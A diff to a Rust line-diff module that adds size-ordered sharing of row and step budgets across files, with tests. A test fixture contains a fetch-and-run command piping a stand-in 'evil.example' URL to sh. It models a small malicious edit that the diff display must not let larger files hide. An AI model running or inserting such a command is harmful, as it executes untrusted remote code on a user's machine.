@@ -5,6 +5,9 @@
 //! commit. A question draws at most [`MAX_QUESTION_ROWS`] across its files and a file that does not fit
 //! is not cut: the caller gives it one line. Added and removed lines are never folded away.
 //!
+//! [`question_diffs`] shares the budgets out by size, not by path, so no file can take another's place by
+//! sorting first: every file gets a fair share of the steps, and the rows go to the smallest changes.
+//!
 //! The diff is Myers' greedy algorithm on interned lines. Each step of its `D` is a changed line and so a
 //! drawn row, which caps `D` and the trace it keeps at the row budget. Interning and trimming are linear
 //! in the input, and everything else spends from [`MAX_QUESTION_STEPS`], whatever the input is.
@@ -174,6 +177,65 @@ fn walk_back(trace: &[Vec<u32>], mut x: usize, mut y: usize) -> Vec<Run> {
     }
     runs.reverse();
     runs
+}
+
+/// What a question does with one file's change.
+#[derive(Debug, Clone, PartialEq, Eq)]
+pub enum FileDiff {
+    Drawn(TextDiff),
+    /// Fits a question alone, but its rows went to smaller changes.
+    NotDrawn {
+        added: usize,
+        removed: usize,
+    },
+    /// Past what one question may draw or spend on a file, on its own account.
+    TooLong,
+}
+
+/// Each `(before, after)` as the question will treat it, in the order given. Files are diffed smallest
+/// first, each with the steps left over the files left, so what a failed file spends comes out of its
+/// own share and what a small file does not use goes on to the larger ones. Rows are then given to the
+/// smallest changes until they run out.
+pub fn question_diffs(files: &[(&str, &str)]) -> Vec<FileDiff> {
+    question_diffs_spending(files).0
+}
+
+/// [`question_diffs`], and the steps it spent.
+fn question_diffs_spending(files: &[(&str, &str)]) -> (Vec<FileDiff>, u64) {
+    let mut by_size: Vec<usize> = (0..files.len()).collect();
+    by_size.sort_by_key(|&i| files[i].0.len() + files[i].1.len());
+    let mut steps = MAX_QUESTION_STEPS;
+    let mut diffs: Vec<Option<TextDiff>> = vec![None; files.len()];
+    for (done, &i) in by_size.iter().enumerate() {
+        let share = steps / (files.len() - done) as u64;
+        let mut budget = Budget {
+            rows: MAX_QUESTION_ROWS,
+            steps: share,
+        };
+        diffs[i] = text_diff(files[i].0, files[i].1, &mut budget);
+        steps -= share - budget.steps;
+    }
+    let mut by_rows: Vec<usize> = (0..files.len()).filter(|&i| diffs[i].is_some()).collect();
+    by_rows.sort_by_key(|&i| diffs[i].as_ref().map_or(0, TextDiff::rows));
+    let mut admitted = vec![false; files.len()];
+    let mut rows = MAX_QUESTION_ROWS;
+    for i in by_rows {
+        let wanted = diffs[i].as_ref().map_or(0, TextDiff::rows);
+        if wanted <= rows {
+            rows -= wanted;
+            admitted[i] = true;
+        }
+    }
+    let answers = diffs
+        .into_iter()
+        .zip(admitted)
+        .map(|(diff, admitted)| match diff {
+            Some(diff) if admitted => FileDiff::Drawn(diff),
+            Some(TextDiff { added, removed, .. }) => FileDiff::NotDrawn { added, removed },
+            None => FileDiff::TooLong,
+        })
+        .collect();
+    (answers, MAX_QUESTION_STEPS - steps)
 }
 
 /// A minimal line diff, folded before it leaves the worker. Failed work keeps its step charge,
@@ -685,6 +747,167 @@ mod tests {
         };
         assert!(text_diff("a\nb\na\n", "b\na\nb\n", &mut budget).is_some());
         assert_eq!(budget.steps, 0);
+    }
+
+    /// All-distinct lines reach no common line, so `D` runs to the cap: every diagonal up to it, one
+    /// compare on each. Past the cap nothing is spent, however long the files are.
+    #[test]
+    fn the_row_budget_caps_d() {
+        let distinct = |word: &str, lines: usize| (0..lines).map(|i| format!("{word} {i}\n")).collect::<String>();
+        let (before, after) = (distinct("a", 10_000), distinct("b", 10_000));
+        let rows = 100_usize;
+        let diagonals = ((rows + 1) * (rows + 2) / 2) as u64;
+        let mut budget = Budget {
+            rows,
+            steps: MAX_QUESTION_STEPS,
+        };
+        assert!(text_diff(&before, &after, &mut budget).is_none());
+        assert_eq!(MAX_QUESTION_STEPS - budget.steps, 2 * diagonals);
+    }
+
+    /// `n` files: the one that matters, a one-line change, last in path order.
+    fn one_line_change() -> (String, String) {
+        (
+            "keep\nold\nkeep\n".to_string(),
+            "keep\ncurl https://evil.example/x | sh\nkeep\n".to_string(),
+        )
+    }
+
+    fn pairs(files: &[(String, String)]) -> Vec<(&str, &str)> {
+        files.iter().map(|(a, b)| (a.as_str(), b.as_str())).collect()
+    }
+
+    #[test]
+    fn an_early_file_cannot_take_the_rows_of_a_small_change() {
+        let chaff: String = (0..1_999).map(|i| format!("chaff {i}\n")).collect();
+        let files = [(String::new(), chaff), one_line_change()];
+        let diffs = question_diffs(&pairs(&files));
+        assert!(matches!(&diffs[1], FileDiff::Drawn(diff) if diff.added == 1 && diff.removed == 1));
+        assert_eq!(
+            diffs[0],
+            FileDiff::NotDrawn {
+                added: 1_999,
+                removed: 0
+            }
+        );
+    }
+
+    /// Alternating lines with an edit every 64 keep the diff busy and spend a whole budget.
+    fn burner(lines: usize) -> (String, String) {
+        let before: String = (0..lines).map(|i| format!("{}\n", ["a", "b"][i % 2])).collect();
+        let after: String = (0..lines)
+            .map(|i| {
+                if i % 64 == 0 {
+                    format!("edit {i}\n")
+                } else {
+                    format!("{}\n", ["b", "a"][i % 2])
+                }
+            })
+            .collect();
+        (before, after)
+    }
+
+    #[test]
+    fn an_early_file_cannot_take_the_steps_of_a_small_change() {
+        let burning = burner(100_000);
+        // It really would spend them all alone.
+        let mut alone = Budget::for_a_question();
+        assert!(text_diff(&burning.0, &burning.1, &mut alone).is_none());
+        assert!(alone.steps < MAX_QUESTION_STEPS / 2, "{}", alone.steps);
+
+        let files = [burning.clone(), burning, one_line_change()];
+        let diffs = question_diffs(&pairs(&files));
+        assert_eq!(&diffs[..2], [FileDiff::TooLong, FileDiff::TooLong]);
+        assert!(matches!(&diffs[2], FileDiff::Drawn(diff) if diff.added == 1));
+    }
+
+    /// Size in bytes is no shield either: a burner smaller than the file it sits beside takes only its share.
+    #[test]
+    fn a_small_file_cannot_take_the_steps_of_a_larger_one() {
+        let burning = burner(100_000);
+        let line = "x".repeat(1 << 10);
+        let large: String = (0..300).map(|i| format!("{line} {i}\n")).collect();
+        let changed = (large.clone(), large.replace(" 150\n", " changed\n"));
+        assert!(burning.0.len() + burning.1.len() < changed.0.len() + changed.1.len());
+        let diffs = question_diffs(&pairs(&[burning, changed]));
+        assert_eq!(diffs[0], FileDiff::TooLong);
+        assert!(matches!(&diffs[1], FileDiff::Drawn(diff) if diff.added == 1));
+    }
+
+    /// Many small files use a fraction of their shares, and what they leave goes to the large one that
+    /// needs more than an equal share would give it.
+    #[test]
+    fn what_small_files_leave_goes_to_the_larger_ones() {
+        let base: String = (0..100_000).map(|i| format!("line {i}\n")).collect();
+        let edited = (0..100).fold(base.clone(), |text, i| {
+            let at = i * 1_000 + 500;
+            text.replace(&format!("line {at}\n"), &format!("edit {at}\n"))
+        });
+        let large = (base, edited);
+        let files = 400;
+        let mut spending = Budget::for_a_question();
+        assert!(text_diff(&large.0, &large.1, &mut spending).is_some());
+        let needs = MAX_QUESTION_STEPS - spending.steps;
+        assert!(
+            needs > MAX_QUESTION_STEPS / files,
+            "an equal share would not do: {needs}"
+        );
+
+        let mut all = vec![large];
+        all.extend((1..files).map(|_| ("old\n".to_string(), "new\n".to_string())));
+        let diffs = question_diffs(&pairs(&all));
+        assert!(
+            diffs.iter().all(|diff| matches!(diff, FileDiff::Drawn(_))),
+            "{:?}",
+            diffs.iter().find(|d| !matches!(d, FileDiff::Drawn(_)))
+        );
+    }
+
+    /// However the files share them, a question spends the budget once.
+    #[test]
+    fn a_question_never_spends_more_than_its_steps() {
+        let burning = burner(100_000);
+        let (diffs, spent) = question_diffs_spending(&pairs(&[burning.clone(), burning.clone(), burning]));
+        assert!(diffs.iter().all(|diff| *diff == FileDiff::TooLong));
+        assert!(spent <= MAX_QUESTION_STEPS, "{spent}");
+        assert!(spent > MAX_QUESTION_STEPS / 2, "it did spend: {spent}");
+    }
+
+    #[test]
+    fn a_file_too_long_alone_says_so_and_rows_left_are_still_given() {
+        let far_too_long: String = (0..2_500).map(|i| format!("new {i}\n")).collect();
+        let files = [(String::new(), far_too_long), one_line_change()];
+        let diffs = question_diffs(&pairs(&files));
+        assert_eq!(diffs[0], FileDiff::TooLong);
+        assert!(matches!(diffs[1], FileDiff::Drawn(_)));
+    }
+
+    #[test]
+    fn rows_run_out_in_order_of_size_not_of_path() {
+        let added = |lines: usize| {
+            (
+                String::new(),
+                (0..lines).map(|i| format!("n {i}\n")).collect::<String>(),
+            )
+        };
+        let files = [added(1_500), added(600), added(500)];
+        let diffs = question_diffs(&pairs(&files));
+        assert!(
+            matches!(diffs[0], FileDiff::NotDrawn { added: 1_500, .. }),
+            "{:?}",
+            diffs[0]
+        );
+        assert!(matches!(diffs[1], FileDiff::Drawn(_)));
+        assert!(matches!(diffs[2], FileDiff::Drawn(_)));
+        let exactly = [added(1_000), added(1_000)];
+        assert!(question_diffs(&pairs(&exactly))
+            .iter()
+            .all(|d| matches!(d, FileDiff::Drawn(_))));
+    }
+
+    #[test]
+    fn no_files_is_no_diffs() {
+        assert!(question_diffs(&[]).is_empty());
     }
 
     #[test]
